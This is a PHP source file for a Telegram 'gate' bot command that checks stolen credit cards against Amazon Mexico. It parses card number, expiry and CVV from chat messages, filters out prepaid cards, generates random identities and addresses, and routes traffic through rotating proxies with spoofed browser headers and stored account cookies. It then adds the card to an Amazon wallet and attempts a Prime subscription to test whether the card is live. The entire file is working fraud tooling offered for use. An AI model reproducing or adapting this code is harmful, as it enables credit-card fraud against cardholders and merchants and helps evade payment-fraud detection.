<?php
list($cmd) = explode(" ", $message);
if($cmd == "/mx" or $cmd == ".mx" or $cmd == "!mx"){
$NameGater ='Amazon';
$gateway = '/mx :'.$NameGater;
Contador($gateway);
is_premium();
is_gateroff($NameGater);
sendaction($chatId, typing);
$tiempo_inicial = microtime(true);
deleteprm($userId);
$idRey = "5168647868";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////-
$lista = substr($message, 4);
if (empty($lista)){
        bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Charged: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Pasarela: <code>Amazon MX</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Format: <code>!mx card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
    }
$Rank = getUserRank($userId, $chatId, $Mi_Id);
$lista = cleanon($lista);
if(preg_match_all("/(\d{15,16})[\/\s:|]*?(\d{1,2})[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3,4})/", $lista, $matches)) {
    $lista = $matches[0][0]; 
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
is_valid_card_type($cc, $chatId, $message_id, $keyboard);
if(antispamCheck($userId) != False ){
    reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after ".antispamCheck($userId)."</b><b>s</b>.");
    exit();
}elseif(antispamCheckperemium($userId) != False ){
    reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after ".antispamCheckperemium($userId)."</b><b>s</b>.");
    exit();
}
$cc3 = substr($cc, 0,6);
$res = bininfo($cc3);
$bin1 = binnumber($cc3);
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
    reply_to($chatId,$message_id,$keyboard,"<b>Binned Prepaid ($cc3)</b>.");
exit();
}elseif(Luhn($cc) == 'ERROR'){
    reply_to($chatId,$message_id,$keyboard,"<b>Luhn system is activated</b>");
exit();
}


$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Special: >_$-Amazon MX
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);
$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
antisppre($gId);

$Ck = CookieMx($userId);
$cookies_amaozn   = $Ck['cookie'];

if (empty($cookies_amaozn)){
    bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text' =>"<b>Usa el comando /mxc cookies Para registrar y asii mismo para Update</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
        die();
}


$randomTimeout = rand(5, 10) * 1000;

$randomTimeoutSeconds = $randomTimeout / 1000;

sleep($randomTimeoutSeconds);



$sky = new StrangerN9na();

//$cookie = uniqid();

/// RANDOM DATOS ///
$Getn9 = file_get_contents("https://example.invalid/legacy");
$name = $sky->getStrnv($Getn9, '"first":"', '"');
$last = $sky->getStrnv($Getn9, '"last":"', '"');
$addres = $sky->getStrnv($Getn9, '"street":"', '"');
$city = $sky->getStrnv($Getn9, '"city":"', '"');
$state = $sky->getStrnv($Getn9, '"state":"', '"');
$zip = $sky->getStrnv($Getn9, '"Postn9code":', ',"');

$street = rand(1111, 9999) . " Street Sea";
$email = $name . rand(1111, 9999) . "@gmail.com";
$num = "201" . rand(1111111, 9999999);


$rotate = BotProxyUser();
$socks5 = BotProxyUrl();


$PRX = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];



$Getn9_token = $sky->Getn9(
    "https://example.invalid/legacy",
    [
        'cookie: 'REDACTED_CREDENTIAL'',
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0",
    ],
     null,$PRX
)->body;

if (strpos($get_token, 'Iniciar sesión')) {
bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"Dead Cookie",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
    exit;
}
if (strpos($Getn9_token, 'Lo sentimos.')) {
bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"Ban Cookie o Ip",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
    exit;
}

$csrfToken_Getn9 = $sky->getStrnv($Getn9_token, '<form id="address-ui-address-form" action="/a/addresses/add?ref=ya_address_book_add_Postn9" method="Postn9">', '</form>');
$csrfToken = $sky->getStrnv($csrfToken_Getn9, "<input type='hidden' name='csrfToken' value='", "'");
$state_token = $sky->getStrnv($Getn9_token, 'type="hidden" name="address-ui-widGetn9s-previous-address-form-state-token" value="', '"');
$interaction = $sky->getStrnv($Getn9_token, 'name="address-ui-widGetn9s-address-wizard-interaction-id" value="', '"');
$customerId = $sky->getStrnv($Getn9_token, 'type="hidden" name="address-ui-widGetn9s-obfuscated-customerId" value="', '"');
$widGetn9s_csrfToken = $sky->getStrnv($Getn9_token, 'type="hidden" name="address-ui-widGetn9s-csrfToken" value="', '"');
$start_time = $sky->getStrnv($Getn9_token, 'type="hidden" name="address-ui-widGetn9s-form-load-start-time" value="', '"');


$req = $sky->Postn9(
    "https://example.invalid/legacy",
    "csrfToken="REDACTED_CREDENTIAL"&addressID=&address-ui-widGetn9s-countryCode=US&address-ui-widGetn9s-enterAddressFullName=" . $name . "+" . $last . "&address-ui-widGetn9s-enterAddressPhoneNumber=%2B1" . $num . "&address-ui-widGetn9s-enterAddressLine1=634+59th+Street&address-ui-widGetn9s-enterAddressLine2=&address-ui-widGetn9s-enterAddressCity=Brooklyn&address-ui-widGetn9s-enterAddressStateOrRegion=NY&address-ui-widGetn9s-enterAddressPostn9alCode=11220&address-ui-widGetn9s-previous-address-form-state-token=" . $state_token . "&address-ui-widGetn9s-use-as-my-default=true&address-ui-widGetn9s-addressFormButtonText=save&address-ui-widGetn9s-addressFormHideHeading=true&address-ui-widGetn9s-addressFormHideSubmitButton=false&address-ui-widGetn9s-enableAddressDetails=true&address-ui-widGetn9s-returnLegacyAddressID=false&address-ui-widGetn9s-enableDeliveryInstructions=true&address-ui-widGetn9s-enableAddressWizardInlineSuggestions=false&address-ui-widGetn9s-enableEmailAddress=false&address-ui-widGetn9s-enableAddressTips=true&address-ui-widGetn9s-amazonBusinessGroupId=&address-ui-widGetn9s-clientName=YourAccountAddressBook&address-ui-widGetn9s-enableAddressWizardForm=true&address-ui-widGetn9s-delivery-instructions-data=&address-ui-widGetn9s-address-wizard-interaction-id=" . $interaction . "&address-ui-widGetn9s-obfuscated-customerId=" . $customerId . "&address-ui-widGetn9s-locationData=&address-ui-widGetn9s-enableLatestAddressWizardForm=false&address-ui-widGetn9s-avsSuppressSoftblock=false&address-ui-widGetn9s-avsSuppressSuggestion=false&address-ui-widGetn9s-csrfToken=" . urlencode($widGetn9s_csrfToken) . "&address-ui-widGetn9s-form-load-start-time=" . $start_time . "&address-ui-widGetn9s-enableAddressFormPincodeFieldReordering=false&address-ui-widGetn9s-locale=",
    [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',

        'Accept-Language: es-419,es;q=0.9',
        'Cache-Control: max-age=0',
        'Content-Type: application/x-www-form-urlencoded',
        'Cookie: 'REDACTED_CREDENTIAL'',
        'Device-Memory: 4',
        'Downlink: 10',
        'Dpr: 1',
        'Ect: 4g',
        'Origin: https://example.invalid/legacy',
        'Referer: https://example.invalid/legacy',
        'Rtt: 100',
        'Sec-Ch-Device-Memory: 4',
        'Sec-Ch-Dpr: 1',
        'Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
        'Sec-Ch-Ua-Mobile: ?0',
        'Sec-Ch-Ua-Platform: "Windows"',
        'Sec-Ch-Ua-Platform-Version: "10.0.0"',
        'Sec-Ch-Viewport-Width: 549',
        'Sec-Fetch-Dest: document',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-User: ?1',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
        'Viewport-Width: 549',
    ],
    null,$PRX
)->body;

$addressID = $sky->getStrnv($req, 'class="a-link-normal" href="/a/addresses/edit?ref=ya_address_book_edit_button&amp;addressID=', '"');
$csrfToken__Getn9_1 = $sky->getStrnv($req, '<div class="a-row"><div class="a-column a-span6">', '<span id="deleteAddressModal-1-submit-btn"');

$csrfToken_1 = $sky->getStrnv($csrfToken__Getn9_1, "type='hidden' name='csrfToken' value='", "'");

/// FIN DE AGREGAR DIRECCION RANDOM ////


// //// AGREGAR TARJETA //////////

$req = $sky->Getn9(
    "https://example.invalid/legacy",
    [
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",

        "accept-language: es-ES,es;q=0.9",
        'cookie: 'REDACTED_CREDENTIAL'',
        "device-memory: 4",
        "downlink: 10",
        "dpr: 1",
        "ect: 4g",
        "rtt: 50",
        "sec-ch-device-memory: 4",
        "sec-ch-dpr: 1",
        'sec-ch-ua: "Opera GX";v="99", "Chromium";v="113", "Not-A.Brand";v="24"',
        "sec-ch-ua-mobile: ?0",
        'sec-ch-ua-platform: "Windows"',
        'sec-ch-ua-platform-version: "10.0.0"',
        "sec-ch-viewport-width: 449",
        "sec-fetch-dest: document",
        "sec-fetch-mode: navigate",
        "sec-fetch-site: none",
        "sec-fetch-user: ?1",
        "upgrade-insecure-requests: 1",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0",
        "viewport-width: 449"
    ],
    null,$PRX
)->body;

$marketId = $sky->getStrnv($req, 'marketId: "', '"');
$obfuscatedMarketId = $sky->getStrnv($req, 'obfuscatedMarketId: "', '"');
$requestId = $sky->getStrnv($req, 'requestId: "', '"');
$sessionId = $sky->getStrnv($req, 'sessionId: "', '"');
$customerId = $sky->getStrnv($req, 'customerId: "', '"');
$serializedState = $sky->getStrnv($req, '"serializedState":"', '"');

if (empty($req)) {
bot('editMessaGetn9ext',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>ERROR PROXY</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
    exit;
}

$req1 = $sky->Postn9(
    "https://example.invalid/legacy" . $customerId . "/continueWidGetn9",
    "ppw-jsEnabled=true&ppw-widGetn9State=" . $serializedState . "&ppw-widGetn9Event=StartAddInstrumentEvent",
    [
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",

        "accept-language: es-ES,es;q=0.9",
        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
        "origin: https://example.invalid/legacy",
        "referer: https://example.invalid/legacy",
        'cookie: 'REDACTED_CREDENTIAL'',
        "device-memory: 4",
        "downlink: 10",
        "dpr: 1",
        "ect: 4g",
        "rtt: 50",
        "sec-ch-device-memory: 4",
        "sec-ch-dpr: 1",
        'sec-ch-ua: "Opera GX";v="99", "Chromium";v="113", "Not-A.Brand";v="24"',
        "sec-ch-ua-mobile: ?0",
        'sec-ch-ua-platform: "Windows"',
        'sec-ch-ua-platform-version: "10.0.0"',
        "sec-ch-viewport-width: 449",
        "sec-fetch-dest: document",
        "sec-fetch-mode: navigate",
        "sec-fetch-site: none",
        "sec-fetch-user: ?1",
        "upgrade-insecure-requests: 1",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0",
        "viewport-width: 449",
        "x-requested-with: XMLHttpRequest"
    ],
    null,$PRX
)->body;

$continueWidGetn9 = $sky->getStrnv($req1, 'name=\"ppw-widGetn9State\" value=\"', '\"');


$req2 = $sky->Postn9(
    "https://example.invalid/legacy",
    "widGetn9State=" . $serializedState . "&returnUrl=%2Fcpe%2Fyourpayments%2Fwallet%3Fref_%3Dapx_interstitial&clientId=YA%3AWallet&usePopover=true&maxAgeSeconds=900&iFrameName=ApxSecureIframe-pp-C1Ls6S-5&parentWidGetn9InstanceId=dIcpc3k68l6n&hideAddPaymentInstrumentHeader=true&creatablePaymentMethods=CC",
    [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',

        'Accept-Language: es-ES,es;q=0.9',
        'Cache-Control: max-age=0',
        'Connection: keep-alive',
        'Content-Type: application/x-www-form-urlencoded',
        'cookie: 'REDACTED_CREDENTIAL'',
        'Host: apx-security.amazon.com.mx',
        'Origin: https://example.invalid/legacy',
        'Referer: https://example.invalid/legacy',
        'sec-ch-ua: "Opera GX";v="99", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'Sec-Fetch-Dest: iframe',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: same-site',
        'Sec-Fetch-User: ?1',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0'
    ],
    null,$PRX
)->body;

$widGetn9State = $sky->getStrnv($req2, '"serializedState":"', '"');
$custom_id = $sky->getStrnv($req2, '"customerId":"', '"');



$req3 = $sky->Postn9(
    "https://example.invalid/legacy" . $custom_id . "/continueWidGetn9",
    "ppw-jsEnabled=true&addCreditCardNumber=" . $cc . "&ppw-widGetn9Event=IdentifyCreditCardEvent&ppw-widGetn9State=" . $widGetn9State . "",
    [
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",

        "accept-language: es-ES,es;q=0.9",
        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
        'cookie: 'REDACTED_CREDENTIAL'',
        "Origin: https://example.invalid/legacy",
        "Referer: https://example.invalid/legacy",
        "device-memory: 4",
        "downlink: 10",
        "dpr: 1",
        "ect: 4g",
        "rtt: 50",
        "sec-ch-device-memory: 4",
        "sec-ch-dpr: 1",
        'sec-ch-ua: "Opera GX";v="99", "Chromium";v="113", "Not-A.Brand";v="24"',
        "sec-ch-ua-mobile: ?0",
        'sec-ch-ua-platform: "Windows"',
        'sec-ch-ua-platform-version: "10.0.0"',
        "sec-ch-viewport-width: 449",
        "sec-fetch-dest: document",
        "sec-fetch-mode: navigate",
        "sec-fetch-site: none",
        "sec-fetch-user: ?1",
        "upgrade-insecure-requests: 1",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0",
        "viewport-width: 449",
        "x-requested-with: XMLHttpRequest"
    ],
    null,$PRX
)->body;


$req4 = $sky->Postn9(
    "https://example.invalid/legacy" . $custom_id . "/continueWidGetn9?sif_profile=APX-Encrypt-All-NA",
    "ppw-widGetn9Event%3AAddCreditCardEvent=&ppw-jsEnabled=true&ppw-widGetn9State=" . $widGetn9State . "&ie=UTF-8&addCreditCardNumber=" . $cc . "&ppw-accountHolderName=" . $name . "+" . $last . "&ppw-expirationDate_month=" . $mes . "&ppw-expirationDate_year=" . $ano . "&addCreditCardVerificationNumber=" . $cvv . "&ppw-addCreditCardVerificationNumber_isRequired=true",
    [
        'Accept: application/json, text/javascript, */*; q=0.01',

        'Accept-Language: es-419, es;q=0.9',
        'Apx-WidGetn9-Info: YA:Wallet/desktop/Sc7mZ2rfyPvZ',
        'Connection: keep-alive',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie: 'REDACTED_CREDENTIAL'',
        'Host: apx-security.amazon.com.mx',
        'Origin: https://example.invalid/legacy',
        'Referer: https://example.invalid/legacy',
        'Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
        'Sec-Ch-Ua-Mobile: ?0',
        'Sec-Ch-Ua-Platform: "Windows"',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: same-origin',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
        'WidGetn9-Ajax-Attempt-Count: 0',
        'X-Requested-With: XMLHttpRequest',

    ],
    null,$PRX
)->body;

// FIN DE AGREGAR TARJETA //////////


$req10 = $sky->Getn9(
    "https://example.invalid/legacy",
    [
        'Cookie: 'REDACTED_CREDENTIAL'',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0'
    ],
    null,$PRX
)->body;

$widge_state = $sky->getStrnv($req10, 'name="ppw-widGetn9State" value="', '"');
$offerToken = $sky->getStrnv($req10, 'type="hidden" name="offerToken" value="', '"');
$session_id = $sky->getStrnv($req10, 'name="session-id" value="', '"');
$id_instrument = $sky->getStrnv($req10, '{&quot;instrumentId&quot;:[&quot;', '&quot');
$id_instrument_2 = $sky->getStrnv($req10, '"selectedInstrumentIds":["' . $id_instrument . '","', '"');

$req11_1 = $sky->Postn9(
    "https://example.invalid/legacy" . $custom_id . "/continueWidGetn9",
    "ppw-widGetn9Event%3AViewPreferenceSelectAddressEvent%3A%7B%22iId%22%3A%22" . $id_instrument . "%22%2C%22iT%22%3A%22CreditCard%22%7D=Selecciona+una+direcci%C3%B3n+de+facturaci%C3%B3n&ppw-jsEnabled=true&ppw-widGetn9State=" . $widge_state . "&ie=UTF-8",
    [
        'accept: application/json, text/javascript, */*; q=0.01',

        'accept-language: es-ES,es;q=0.9',
        'apx-widGetn9-info: Subs:Prime/desktop/q3U7g6w4VHJS',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'cookie: 'REDACTED_CREDENTIAL'',
        'device-memory: 4',
        'downlink: 10',
        'dpr: 1',
        'ect: 4g',
        'origin: https://example.invalid/legacy',
        'referer: https://example.invalid/legacy',
        'rtt: 150',
        'sec-ch-device-memory: 4',
        'sec-ch-dpr: 1',
        'sec-ch-ua: "Opera GX";v="99", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-ch-ua-platform-version: "10.0.0"',
        'sec-ch-viewport-width: 690',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0',
        'viewport-width: 690',
        'widGetn9-ajax-attempt-count: 0',
        'x-requested-with: XMLHttpRequest',
    ],
    null,$PRX
)->body;

$addres_id = $sky->getStrnv($req11_1, 'type="hidden" name="offerToken" value="', '"');

$req11_2 = $sky->Postn9(
    "https://example.invalid/legacy" . $custom_id . "/continueWidGetn9",
    "ppw-widGetn9Event%3ASelectAddressEvent=&ppw-jsEnabled=true&ppw-widGetn9State=" . $widge_state . "&ie=UTF-8&ppw-pickAddressType=Standalone&ppw-addressSelection=" . $addres_id . "",
    [
        'accept: application/json, text/javascript, */*; q=0.01',

        'accept-language: es-ES,es;q=0.9',
        'apx-widGetn9-info: Subs:Prime/desktop/q3U7g6w4VHJS',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'cookie: 'REDACTED_CREDENTIAL'',
        'device-memory: 4',
        'downlink: 10',
        'dpr: 1',
        'ect: 4g',
        'origin: https://example.invalid/legacy',
        'referer: https://example.invalid/legacy',
        'rtt: 150',
        'sec-ch-device-memory: 4',
        'sec-ch-dpr: 1',
        'sec-ch-ua: "Opera GX";v="99", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-ch-ua-platform-version: "10.0.0"',
        'sec-ch-viewport-width: 690',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0',
        'viewport-width: 690',
        'widGetn9-ajax-attempt-count: 0',
        'x-requested-with: XMLHttpRequest',
    ],
    null,$PRX
)->body;

$req11_3 = $sky->Postn9(
    "https://example.invalid/legacy" . $custom_id . "/continueWidGetn9",
    "ppw-widGetn9Event%3AShowPreferencePaymentOptionListEvent%3A%7B%22instrumentId%22%3A%5B%22" . $id_instrument . "%22%5D%2C%22instrumentIds%22%3A%5B%22" . $id_instrument . "%22%2C%22" . $id_instrument_2 . "%22%5D%7D=cambiar&ppw-jsEnabled=true&ppw-widGetn9State=" . $widge_state . "&ie=UTF-8",
    [
        'accept: application/json, text/javascript, */*; q=0.01',

        'accept-language: es-ES,es;q=0.9',
        'apx-widGetn9-info: Subs:Prime/desktop/USy0r1nNW10s',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'cookie: 'REDACTED_CREDENTIAL'',
        'device-memory: 4',
        'downlink: 10',
        'dpr: 1',
        'ect: 4g',
        'origin: https://example.invalid/legacy',
        'rtt: 250',
        'sec-ch-device-memory: 4',
        'sec-ch-dpr: 1',
        'sec-ch-ua: "Opera GX";v="99", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-ch-ua-platform-version: "10.0.0"',
        'sec-ch-viewport-width: 690',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0',
        'viewport-width: 690',
        'widGetn9-ajax-attempt-count: 0',
        'x-requested-with: XMLHttpRequest',
    ],
    null,$PRX
)->body;

$instrument_id_1 = $sky->getStrnv($req11_3, 'data-instrument-id=\"', '\"');
$instrument_id_2 = $sky->getStrnv($req11_3, 'id=\"pp-HpbG6H-69\" data-instrument-id=\"', '\"');



$req11_4 = $sky->Postn9(
    "https://example.invalid/legacy" . $custom_id . "/continueWidGetn9",
    "ppw-widGetn9Event%3APreferencePaymentOptionSelectionEvent=&ppw-jsEnabled=true&ppw-widGetn9State=" . $widge_state . "&ie=UTF-8&ppw-instrumentRowSelection=instrumentId%3D" . $instrument_id_1 . "%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse&ppw-" . $instrument_id_1 . "_instrumentOrderTotalBalance=%7B%7D&ppw-giftCardSelection=instrumentId%3D" . $instrument_id_2 . "%26paymentMethod%3DGC%26eligibleBackingMethods%3DCC%26requireBackingInstrument%3Dtrue",
    [
        'accept: application/json, text/javascript, */*; q=0.01',

        'accept-language: es-ES,es;q=0.9',
        'apx-widGetn9-info: Subs:Prime/desktop/USy0r1nNW10s',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'cookie: 'REDACTED_CREDENTIAL'',
        'device-memory: 4',
        'downlink: 10',
        'dpr: 1',
        'ect: 4g',
        'origin: https://example.invalid/legacy',
        'rtt: 250',
        'sec-ch-device-memory: 4',
        'sec-ch-dpr: 1',
        'sec-ch-ua: "Opera GX";v="99", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-ch-ua-platform-version: "10.0.0"',
        'sec-ch-viewport-width: 690',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0',
        'viewport-width: 690',
        'widGetn9-ajax-attempt-count: 0',
        'x-requested-with: XMLHttpRequest',
    ],
    null,$PRX
)->body;

$req11 = $sky->Postn9(
    "https://example.invalid/legacy" . $custom_id . "/continueWidGetn9",
    "ppw-jsEnabled=true&ppw-widGetn9State=" . $widge_state . "&ppw-widGetn9Event=SavePaymentPreferenceEvent",
    [
        'accept: application/json, text/javascript, */*; q=0.01',

        'accept-language: es-ES,es;q=0.9',
        'apx-widGetn9-info: Subs:Prime/desktop/KGKaQnh38xul',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'cookie: 'REDACTED_CREDENTIAL'',
        'device-memory: 4',
        'downlink: 10',
        'dpr: 1',
        'ect: 4g',
        'origin: https://example.invalid/legacy',
        'referer: https://example.invalid/legacy',
        'rtt: 50',
        'sec-ch-device-memory: 4',
        'sec-ch-dpr: 1',
        'sec-ch-ua: "Opera GX";v="99", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-ch-ua-platform-version: "10.0.0"',
        'sec-ch-viewport-width: 414',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0',
        'viewport-width: 414',
        'widGetn9-ajax-attempt-count: 0',
        'x-requested-with: XMLHttpRequest',
    ],
    null,$PRX
)->body;

$preferenceId = $sky->getStrnv($req11, '"preferenceId":"', '"');
$id_1 = $sky->getStrnv($req11, '"preferencePaymentMethodIds":"[\"', '\"');
$id_2 = $sky->getStrnv($req11, '"preferencePaymentMethodIds":"[\"' . $id_1 . '\",\"', '\"]"');

$req12 = $sky->Postn9(
    "https://example.invalid/legacy",
    "offerToken="REDACTED_CREDENTIAL"&session-id=" . $session_id . "&wlpLocation=prime_default&isAsinEligibleForFamilyBenefit=0&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&paymentMethodId=" . $id_1 . "%2C" . $id_2 . "&isHorizonteFlow=1&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet",
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',

        'accept-language: es-ES,es;q=0.9',
        'cache-control: max-age=0',
        'content-type: application/x-www-form-urlencoded',
        'cookie: 'REDACTED_CREDENTIAL'',
        'device-memory: 4',
        'downlink: 10',
        'dpr: 1',
        'ect: 4g',
        'origin: https://example.invalid/legacy',
        'referer: https://example.invalid/legacy',
        'rtt: 50',
        'sec-ch-device-memory: 4',
        'sec-ch-dpr: 1',
        'sec-ch-ua: "Opera GX";v="99", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-ch-ua-platform-version: "10.0.0"',
        'sec-ch-viewport-width: 414',
        'sec-fetch-dest: document',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: same-origin',
        'sec-fetch-user: ?1',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0',
        'viewport-width: 414',
    ],
    null,$PRX
)->body;
